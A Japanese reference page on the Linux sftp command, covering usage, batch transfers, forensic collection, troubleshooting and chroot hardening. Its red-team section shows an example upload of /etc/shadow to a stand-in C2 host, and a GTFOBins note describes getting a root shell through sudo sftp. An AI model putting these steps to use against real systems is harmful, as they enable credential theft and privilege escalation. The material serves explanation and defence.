# Command  - Linux -  sftp - SSHプロトコルで対話的にファイルを転送する

## 概要

`sftp` (SSH File Transfer Protocol) は、SSHプロトコル上で動作する、対話的なファイル転送プログラムです。FTPに似たコマンド体系 (`ls`, `cd`, `get`, `put`など) を持ちながら、通信はSSHによって完全に暗号化されるため、安全にファイル操作を行うことができます。リモートサーバーのファイルシステムを探索しながら、複数のファイルを選択的にアップロード・ダウンロードするのに適しています。

(出自: `openssh-client` パッケージに含まれる)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- |:---|
| ⭐ **`scp`** | **非対話的**なファイル転送コマンド。単一のファイルやディレクトリを一度のコマンドでコピーするのに向いています。`sftp` は**対話的**なセッションを開始し、その中で複数のコマンドを実行します。 | `scp` (単発コピー) / `sftp` (対話的操作) |
| **`ftp`** | 古典的なファイル転送プロトコル。認証情報やデータが**平文で送信されるため、非推奨**です。 | `sftp` |
| **`rsync -e ssh`**| ディレクトリの**同期**に特化した高機能ツール。差分転送により効率的です。 | `rsync` (ディレクトリ同期) |

## よく連携されるコマンド

`sftp` はバッチモード (`-b`) を使うことで、スクリプトによるファイル転送の自動化が可能です。

### シナリオ例: スクリプトで複数のファイルを自動ダウンロードする (インフラ構築・運用視点)

* **目的**: 夜間バッチで、リモートサーバーから複数のログファイルを自動的にダウンロードする。
* **連携コマンド**: `sftp` (`-b` オプション)
* **解説**: `get` や `put` などの `sftp` 内部コマンドを記述したバッチファイルを作成し、`-b` オプションでそれを指定して `sftp` を実行します。これにより、非対話的なファイル転送を実現できます。
* **コマンド例**:

		```bash
    # batchfile.txt の中身
    # cd /var/log/app
    # mget *.log
    # quit

    # バッチファイルを指定してsftpを実行

    sftp -b batchfile.txt user@remote-server

    ```


## オプション説明 (`sftp` 内部のコマンド)

`sftp <user>@<host>` で接続後、`sftp>` プロンプトで以下のコマンドが利用可能です。

| コマンド | 機能 (リモート側) | 関連コマンド (ローカル側) |
| :--- | :--- | :--- |
| **接続** | | |
| ⭐ `quit` / `bye`| `sftp` セッションを終了します。 | |
| **ファイル取得/配置**| | |
| ⭐ `get <remote-file>`| **リモート**からローカルにファイルを**ダウンロード**します。 | |
| ⭐ `put <local-file>`| ローカルから**リモート**にファイルを**アップロード**します。 | |
| `-r get <remote-dir>`| ディレクトリを再帰的にダウンロードします。 | |
| **ナビゲーション** | - | - |
| ⭐ `ls` | **リモート**のファイル・ディレクトリを一覧表示します。 | `lls` (ローカルの一覧) |
| `pwd` | **リモート**のカレントディレクトリを表示します。 | `lpwd` (ローカルのカレントディレクトリ) |
| `cd <path>`| **リモート**のディレクトリを移動します。 | `lcd <path>` (ローカルのディレクトリを移動) |
| **ファイル操作** | - | - |
| `mkdir <dir>`| **リモート**にディレクトリを作成します。 | |
| `rm <file>` | **リモート**のファイルを削除します。 | |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: リモートサーバーに接続し、対話的にファイルを操作する。
* **組み合わせ**: `sftp -i <key_file> <user>@<host>`
* **解説**: 秘密鍵を指定してサーバーに接続し、`cd`, `ls`, `get`, `put` を使ってファイルや設定をやり取りする、最も基本的な使い方です。
* **例**:

		```bash
    # サーバーに接続

    sftp -i ~/.ssh/prod-key.pem admin@prod-server

    # sftpプロンプトで操作

    sftp> cd /etc/nginx/conf.d

    sftp> get default.conf

    sftp> quit

    ```


### 2. ブルーチーム視点

* **タスク**: 侵害されたホストから、ファイルシステムを探索しながら証拠ファイルを収集する。
* **組み合わせ**: `sftp <user>@<compromised_host>`
* **解説**: `scp` でディレクトリ全体をコピーするのではなく、`sftp` の対話セッションで `/tmp` や `/home` を探索し、タイムスタンプやファイルサイズから不審なファイルだけを特定し、`get` コマンドで選択的に収集します。
* **例**:

		```bash

    sftp analyst@compromised-host

    sftp> ls -l /tmp

    sftp> get /tmp/evil.sh

    ```


### 3. レッドチーム視点

* **タスク**: **データ窃取 (Data Exfiltration)** と**ツール管理**。
* **組み合わせ**: `sftp <attacker>@<c2_server>`
* **解説**: 攻撃者はシステム侵入後、`sftp` を使って自身のC2サーバーに接続し、`put stolen_data.zip` のように窃取したデータをアップロードしたり、`get nmap` のように次の攻撃で必要となるツールを追加でダウンロードしたりします。
* **例**:

		```bash
    # C2サーバーに接続

    sftp attacker@c2.example.com

    # 窃取したパスワードハッシュをアップロード

    sftp> put /etc/shadow

    ```


## エラーメッセージとトラブルシューティング

* 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。

1. **エラーメッセージ例 1**: `Permission denied (publickey,password).`
		* **考えられる原因**: `scp` と同じく、SSHの認証エラーです。
		* **解決策**: ユーザー名、パスワード、鍵のパスと設定を再確認してください。

2. **エラーメッセージ例 2 (sftp内部)**: `Couldn't get remote file: Permission denied`
		* **考えられる原因**: リモートサーバー上のユーザーに、`get` しようとしたファイルを読み取る権限がありません。
		* **解決策**: リモートサーバー側でファイルのパーミッションを確認してください。

## 環境変数と設定ファイル

* `sftp` は `~/.ssh/config` の設定（ホスト名エイリアス、ユーザー名、ポート、秘密鍵など）を読み込んで利用します。
* 一般的な環境変数・設定ファイルは [Linux共通の環境変数・設定ファイル](./environment_and_config.md) を参照。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: `sftp` 自体よりも、**不適切なサーバー設定**がリスクとなります。
* **悪用シナリオ**: `sftp` をファイルアップロード専用サービスとして提供する場合、ユーザーを特定のディレクトリに閉じ込める **chroot jail** の設定が不可欠です。この設定がないと、ユーザーがサーバー全体のファイルシステムを閲覧できてしまい、情報漏洩に繋がります。

### GTFOBins / LOLBAS における利用例

* **機能**: **Privilege Escalation**
* **解説**: もしユーザーが `sudo sftp` を実行できる権限を持っている場合、対話モード内で `!` コマンドを使ってローカルのシェルを起動できます。このシェルは `sftp` を実行した `root` 権限を継承するため、結果としてrootシェルを奪取できます。
* **参照**: `https://gtfobins.github.io/gtfobins/sftp/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: `sftp` 専用ユーザーには、`sshd_config` で `ChrootDirectory` を設定し、シェルアクセスを無効化 (`ForceCommand internal-sftp`) する。`sudoers` の設定を厳格にする。
* **Detection (検知)**: `sshd` のログを監視し、`sftp` セッションの開始や、予期せぬファイル操作がないかを確認する。

## 注意点・補足

* **chroot jail**: `sshd_config` で `ChrootDirectory %h` を設定すると、`sftp` ユーザーは自身のホームディレクトリ (`%h`) より上の階層に移動できなくなり、セキュリティが大幅に向上します。
